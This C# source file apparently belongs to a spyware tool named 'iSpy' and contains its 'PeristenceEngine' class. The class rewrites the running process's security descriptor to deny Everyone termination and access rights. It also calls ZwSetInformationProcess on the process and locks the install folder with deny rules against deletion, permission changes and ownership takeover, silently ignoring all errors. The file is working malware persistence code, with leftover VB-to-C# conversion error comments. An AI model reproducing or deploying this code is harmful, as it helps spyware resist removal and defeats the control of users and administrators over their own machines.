using Microsoft.VisualBasic;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Data;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.ComponentModel;
using System.Security;
namespace iSpy
{


    class PeristenceEngine
    {
        [DllImport("kernel32.dll", EntryPoint = "GetCurrentProcess"), SuppressUnmanagedCodeSecurity()]
        private static extern IntPtr GetCurrentProcess();
        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool SetKernelObjectSecurity(IntPtr Handle, int securityInformation, [In()]
    byte[] pSecurityDescriptor);
        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool GetKernelObjectSecurity(IntPtr Handle, int securityInformation, [Out()]
    byte[] pSecurityDescriptor, uint nLength, ref uint lpnLengthNeeded);
        public static void ProtectCurrentProcess()
        {
            try
            {
                IntPtr hProcess = GetCurrentProcess();
                dynamic dal = ParseProcDescriptor(hProcess);
                dal.DiscretionaryAcl.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, Convert.ToInt32(0xf0000), new SecurityIdentifier(WellKnownSidType.WorldSid, null), false, null));
                dal.DiscretionaryAcl.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, Convert.ToInt32(0x100), new SecurityIdentifier(WellKnownSidType.WorldSid, null), false, null));
                dal.DiscretionaryAcl.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, Convert.ToInt32(0xfff), new SecurityIdentifier(WellKnownSidType.WorldSid, null), false, null));
                dal.DiscretionaryAcl.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, Convert.ToInt32(0x1000), new SecurityIdentifier(WellKnownSidType.WorldSid, null), false, null));
                EditProcDescriptor(hProcess, dal);
            }
            catch
            {
            }
        }
        [DllImport("ntdll.dll", EntryPoint = "ZwSetInformationProcess"), SuppressUnmanagedCodeSecurity()]
        private static extern void ZwSetInformationProcess(IntPtr Handle, int ProcessIOPriority, ref int SignedValue, int ProcessInformationLength);
        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(int processAccess, bool bInheritHandle, int processId);
        public static void ProtectProcess(int PID)
        {
            try
            {

                int a = Convert.ToInt32(2147545385L);
                if (PID == 0)
                {
                    ZwSetInformationProcess(GetCurrentProcess(), 33, ref a, 4);
                }
                else
                {
                    ZwSetInformationProcess(OpenProcess(512, true, PID), 33, ref a, 4);
                }
            }
            catch
            {
            }

        }

        public static void ProtectFileFolder(bool File = false)
        {
            try
            {
                string FolderPath = Core.GetPInstallPathNoFilename();
                string UserAccount = "EVERYONE";
                System.IO.DirectoryInfo FolderInfo = new System.IO.DirectoryInfo(FolderPath);
                DirectorySecurity FolderAcl = new DirectorySecurity();
                FolderAcl.AddAccessRule(new FileSystemAccessRule(UserAccount, FileSystemRights.ReadAttributes, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
                FolderAcl.AddAccessRule(new FileSystemAccessRule(UserAccount, FileSystemRights.CreateDirectories, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
                FolderAcl.AddAccessRule(new FileSystemAccessRule(UserAccount, FileSystemRights.WriteAttributes, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
                FolderAcl.AddAccessRule(new FileSystemAccessRule(UserAccount, FileSystemRights.WriteExtendedAttributes, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
                FolderAcl.AddAccessRule(new FileSystemAccessRule(UserAccount, FileSystemRights.Delete, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
                FolderAcl.AddAccessRule(new FileSystemAccessRule(UserAccount, FileSystemRights.DeleteSubdirectoriesAndFiles, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
                FolderAcl.AddAccessRule(new FileSystemAccessRule(UserAccount, FileSystemRights.ChangePermissions, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
                FolderAcl.AddAccessRule(new FileSystemAccessRule(UserAccount, FileSystemRights.TakeOwnership, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
                if(!File)
                {
                    FolderAcl.SetAccessRuleProtection(false, true);
                }
                FolderInfo.SetAccessControl(FolderAcl);
            }
            catch
            {
            }
        }

        public void ResetFileFolderACL(string location)
        {
            try
            {
                string FolderPath = location;
                System.IO.DirectoryInfo FolderInfo = new System.IO.DirectoryInfo(FolderPath);
                DirectorySecurity FolderAcl = new DirectorySecurity();
                FolderAcl.SetAccessRuleProtection(false, true);
                FolderInfo.SetAccessControl(FolderAcl);
            }
            catch
            {
            }
        }  
        private static RawSecurityDescriptor ParseProcDescriptor(IntPtr processHandle)
        {
            // ERROR: Not supported in C#: OnErrorStatement

            const int dal_SECURITY_INFORMATION = 0x4;
            byte[] buff = new byte[-1 + 1];
            uint setblock = 0;
            GetKernelObjectSecurity(processHandle, dal_SECURITY_INFORMATION, buff, 0, ref setblock);
            if (setblock < 0 || setblock > short.MaxValue)
            {
                throw new Win32Exception();
            }
            if (!GetKernelObjectSecurity(processHandle, dal_SECURITY_INFORMATION, InlineAssignHelper(ref buff, new byte[setblock]), setblock, ref setblock))
            {
                throw new Win32Exception();
            }
            return new RawSecurityDescriptor(buff, 0);

        }
        private static void EditProcDescriptor(IntPtr processHandle, RawSecurityDescriptor dal)
        {
            // ERROR: Not supported in C#: OnErrorStatement

            const int dal_SECURITY_INFORMATION = 0x4;
            byte[] rawsd = new byte[dal.BinaryLength];
            dal.GetBinaryForm(rawsd, 0);
            if (!SetKernelObjectSecurity(processHandle, dal_SECURITY_INFORMATION, rawsd))
            {
                throw new Win32Exception();
            }
        }
        private static T InlineAssignHelper<T>(ref T app, T ret)
        {
            app = ret;
            return ret;
        }
    }
}